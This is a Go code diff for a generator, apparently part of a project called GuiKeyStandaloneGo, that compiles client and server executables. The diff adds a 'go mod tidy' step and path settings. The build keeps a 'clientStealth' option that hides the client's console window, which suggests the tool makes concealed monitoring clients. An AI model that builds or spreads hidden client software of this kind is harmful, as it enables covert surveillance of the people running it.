@@ -10,13 +10,10 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-
-	// "runtime" // No longer needed for template path resolution
 	"strings"
 	"time"
 
 	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/config"
-
 	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto"
 
 	"github.com/libp2p/go-libp2p/core/peer"
@@ -27,9 +24,10 @@ type GeneratorSettings struct {
 	BootstrapAddresses    string
 	ClientConfigOverrides config.ClientSettings
 	ServerConfigOverrides config.ServerSettings
-	GoExecutablePath      string                               // Path to the go executable (e.g., "go" or "/path/to/extracted/go.exe")
-	TemplatesBasePath     string                               // Base path where 'client_template' and 'server_template' dirs reside
-	ProgressCallback      func(message string, percentage int) // Callback for GUI/CLI progress
+	GoExecutablePath      string // Path to the go executable
+	TemplatesBasePath     string // Base path where 'client_template' & 'server_template' dirs reside directly (e.g., .../temp_module/generator/templates)
+	TempModuleRootPath    string // Path to the root of the temporary module (for 'go mod tidy')
+	ProgressCallback      func(message string, percentage int)
 }
 
 type GeneratedInfo struct {
@@ -147,13 +145,13 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 		return genInfo, fmt.Errorf("output directory is not set")
 	}
 	if genSettings.GoExecutablePath == "" {
-		// For CLI, this might default to "go" if not provided by the CLI main.
-		// For GUI, this path MUST be the path to the extracted go.exe.
-		// We'll let it proceed and fail at compileGoTemplate if it's still empty there.
-		log.Println("[core] WARNING: GoExecutablePath is empty in GeneratorSettings. Compilation will likely use 'go' from PATH or fail if not found.")
+		log.Println("[core] WARNING: GoExecutablePath is empty. Compilation will use 'go' from PATH or fail.")
 	}
-	if genSettings.TemplatesBasePath == "" {
-		return genInfo, fmt.Errorf("templates base path not provided in settings (TemplatesBasePath is empty)")
+	if genSettings.TemplatesBasePath == "" { // e.g., .../temp_module/generator/templates
+		return genInfo, fmt.Errorf("templates base path not provided (TemplatesBasePath is empty)")
+	}
+	if genSettings.TempModuleRootPath == "" { // e.g., .../temp_module
+		return genInfo, fmt.Errorf("temporary module root path not provided (TempModuleRootPath is empty)")
 	}
 
 	absOutputDir, err := filepath.Abs(genSettings.OutputDirPath)
@@ -219,23 +217,22 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 	}
 	genSettings.ProgressCallback("Server configuration values prepared.", 25)
 
-	// Use the TemplatesBasePath provided in settings
-	templatesBaseDir := genSettings.TemplatesBasePath
-	log.Printf("[core] Using TemplatesBasePath from settings: %s", templatesBaseDir)
+	// TemplatesBasePath is e.g. .../temp_module_root/generator/templates
+	// clientSrcPath becomes .../temp_module_root/generator/templates/client_template
+	clientSrcPath := filepath.Join(genSettings.TemplatesBasePath, "client_template")
+	serverSrcPath := filepath.Join(genSettings.TemplatesBasePath, "server_template")
 
-	clientSrcPath := filepath.Join(templatesBaseDir, "client_template")
-	serverSrcPath := filepath.Join(templatesBaseDir, "server_template")
-	log.Printf("[core] Resolved client_template source path: %s", clientSrcPath)
-	log.Printf("[core] Resolved server_template source path: %s", serverSrcPath)
+	log.Printf("[core] Using TemplatesBasePath from settings: %s", genSettings.TemplatesBasePath)
+	log.Printf("[core] Resolved client_template source path for build: %s", clientSrcPath)
+	log.Printf("[core] Resolved server_template source path for build: %s", serverSrcPath)
 
-	// Verify that these template source paths actually exist before proceeding
 	if _, errStat := os.Stat(clientSrcPath); os.IsNotExist(errStat) {
-		err := fmt.Errorf("client template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'client_template' subdirectory is present", clientSrcPath, templatesBaseDir)
+		err := fmt.Errorf("client template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'client_template' subdirectory is present and extracted correctly", clientSrcPath, genSettings.TemplatesBasePath)
 		log.Printf("[core] ERROR: %v", err)
 		return genInfo, err
 	}
 	if _, errStat := os.Stat(serverSrcPath); os.IsNotExist(errStat) {
-		err := fmt.Errorf("server template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'server_template' subdirectory is present", serverSrcPath, templatesBaseDir)
+		err := fmt.Errorf("server template source path does not exist: '%s'. Check TemplatesBasePath ('%s') and ensure 'server_template' subdirectory is present and extracted correctly", serverSrcPath, genSettings.TemplatesBasePath)
 		log.Printf("[core] ERROR: %v", err)
 		return genInfo, err
 	}
@@ -293,11 +290,25 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
 	serverOutPath := filepath.Join(serverPackagePath, serverExeName)
 
+	// Run 'go mod tidy' in the root of the temporary module.
+	genSettings.ProgressCallback("Ensuring module dependencies (go mod tidy)...", 42)
+	if err := runGoModTidy(genSettings.TempModuleRootPath, genSettings.GoExecutablePath); err != nil {
+		return genInfo, fmt.Errorf("failed to run 'go mod tidy': %w", err)
+	}
+	genSettings.ProgressCallback("Module dependencies ensured.", 45)
+
 	genSettings.ProgressCallback(fmt.Sprintf("Compiling client template from %s...", clientSrcPath), 45)
 	if err := compileGoTemplate(clientSrcPath, clientOutPath, true, genSettings.GoExecutablePath); err != nil {
 		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
 	}
 	genSettings.ProgressCallback("Client template compiled.", 60)
+
+	// No need to run tidy again unless server has drastically different top-level deps not covered.
+	// genSettings.ProgressCallback("Ensuring module dependencies (go mod tidy) for server...", 62)
+	// if err := runGoModTidy(genSettings.TempModuleRootPath, genSettings.GoExecutablePath); err != nil {
+	// 	log.Printf("[core] Warning: Second 'go mod tidy' for server compilation failed (might be okay): %v", err)
+	// }
+	// genSettings.ProgressCallback("Server dependencies ensured.", 65)
 
 	genSettings.ProgressCallback(fmt.Sprintf("Compiling server template from %s...", serverSrcPath), 65)
 	if err := compileGoTemplate(serverSrcPath, serverOutPath, false, genSettings.GoExecutablePath); err != nil {
@@ -308,7 +319,6 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
 	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")
 
-	// Source paths for static/web_templates are relative to the serverSrcPath
 	sourceStaticDir := filepath.Join(serverSrcPath, "static")
 	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")
 	log.Printf("[core] Copying server static assets from: %s", sourceStaticDir)
@@ -324,7 +334,7 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 
 	readmeData := struct {
 		Timestamp          string
-		Generated          GeneratedInfo // This refers to the local genInfo, not the struct type
+		Generated          GeneratedInfo
 		ClientConfig       config.ClientSettings
 		ServerConfig       config.ServerSettings
 		ClientExeName      string
@@ -332,7 +342,7 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 		WebUIAccessAddress string
 	}{
 		Timestamp:          time.Now().Format(time.RFC1123),
-		Generated:          genInfo, // Pass the populated genInfo struct
+		Generated:          genInfo,
 		ClientConfig:       clientCfgValues,
 		ServerConfig:       serverCfgValues,
 		ClientExeName:      clientExeName,
@@ -347,7 +357,7 @@ func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
 	if err := tmplReadme.Execute(&readmeBuf, readmeData); err != nil {
 		return genInfo, fmt.Errorf("failed to execute README template to buffer: %w", err)
 	}
-	genInfo.ReadmeContent = readmeBuf.String() // Store for GUI
+	genInfo.ReadmeContent = readmeBuf.String()
 
 	readmeFilePath := filepath.Join(absOutputDir, "README_IMPORTANT_INSTRUCTIONS.txt")
 	readmeFile, err := os.Create(readmeFilePath)
@@ -373,9 +383,8 @@ func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) e
 		return fmt.Errorf("parsing Go config template for %s: %w", filepath.Base(path), err)
 	}
 	parentDir := filepath.Dir(path)
-	if err := os.MkdirAll(parentDir, 0755); err != nil { // Should already exist if TemplatesBasePath is correct
+	if err := os.MkdirAll(parentDir, 0755); err != nil {
 		log.Printf("[core] Info: Attempted to create parent dir %s for generated Go config (might already exist or path is wrong)", parentDir)
-		// return fmt.Errorf("creating parent directory %s for generated Go config: %w", parentDir, err)
 	}
 	file, err := os.Create(path)
 	if err != nil {
@@ -388,10 +397,47 @@ func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) e
 	return nil
 }
 
+func runGoModTidy(moduleDir string, goExecutable string) error {
+	effectiveGoExecutable := goExecutable
+	if effectiveGoExecutable == "" {
+		effectiveGoExecutable = "go"
+		log.Printf("[core-gomod] GoExecutablePath not provided, defaulting to '%s' from PATH for 'go mod tidy'", effectiveGoExecutable)
+	}
+
+	cmd := exec.Command(effectiveGoExecutable, "mod", "tidy")
+	cmd.Dir = moduleDir
+	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
+
+	var stdout bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	log.Printf("[core-gomod] Running 'go mod tidy': %s mod tidy (Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
+		effectiveGoExecutable,
+		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
+		buildEnvValueFor("CGO_ENABLED", cmd.Env),
+		cmd.Dir)
+
+	startTime := time.Now()
+	if err := cmd.Run(); err != nil {
+		errMsg := fmt.Sprintf("failed to run 'go mod tidy' in %s (command: %s mod tidy): %v\nStdout: %s\nStderr: %s",
+			moduleDir, effectiveGoExecutable, err, stdout.String(), stderr.String())
+		log.Printf("[core-gomod] ERROR: %s", errMsg)
+		return fmt.Errorf(errMsg)
+	}
+	duration := time.Since(startTime)
+	log.Printf("[core-gomod] Successfully ran 'go mod tidy' in %s in %v. Output:\n%s", moduleDir, duration, stdout.String())
+	if stderr.Len() > 0 {
+		log.Printf("[core-gomod] Stderr during 'go mod tidy' in %s:\n%s", moduleDir, stderr.String())
+	}
+	return nil
+}
+
 func compileGoTemplate(srcDir, outputPath string, clientStealth bool, goExecutable string) error {
 	effectiveGoExecutable := goExecutable
 	if effectiveGoExecutable == "" {
-		effectiveGoExecutable = "go" // Default to "go" in PATH if not specified
+		effectiveGoExecutable = "go"
 		log.Printf("[core-compile] GoExecutablePath not provided, defaulting to '%s' from PATH for compiling %s", effectiveGoExecutable, srcDir)
 	}
 
@@ -402,12 +448,12 @@ func compileGoTemplate(srcDir, outputPath string, clientStealth bool, goExecutab
 	if clientStealth {
 		ldflags = append(ldflags, "-H=windowsgui")
 	}
-	ldflags = append(ldflags, "-s", "-w") // For smaller binaries
+	ldflags = append(ldflags, "-s", "-w")
 
 	if len(ldflags) > 0 {
 		args = append(args, "-ldflags="+strings.Join(ldflags, " "))
 	}
-	args = append(args, ".") // Build the package in srcDir
+	args = append(args, ".")
 
 	cmd := exec.Command(effectiveGoExecutable, args...)
 	cmd.Dir = srcDir
@@ -454,7 +500,7 @@ func copyDir(src string, dst string) error {
 	if err != nil {
 		if os.IsNotExist(err) {
 			log.Printf("[core-copy] Info: Source directory %s does not exist, skipping copy.", src)
-			return nil // Not an error if source doesn't exist (e.g., optional assets)
+			return nil
 		}
 		return fmt.Errorf("stating source dir %s: %w", src, err)
 	}
@@ -473,7 +519,7 @@ func copyDir(src string, dst string) error {
 		dstPath := filepath.Join(dst, entry.Name())
 		if entry.IsDir() {
 			if err := copyDir(srcPath, dstPath); err != nil {
-				return err // Propagate error
+				return err
 			}
 		} else {
 			srcFile, errF := os.Open(srcPath)
@@ -492,7 +538,6 @@ func copyDir(src string, dst string) error {
 			}
 			srcFile.Close()
 			dstFile.Close()
-			// Preserve permissions
 			fileInfo, errI := entry.Info()
 			if errI == nil {
 				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
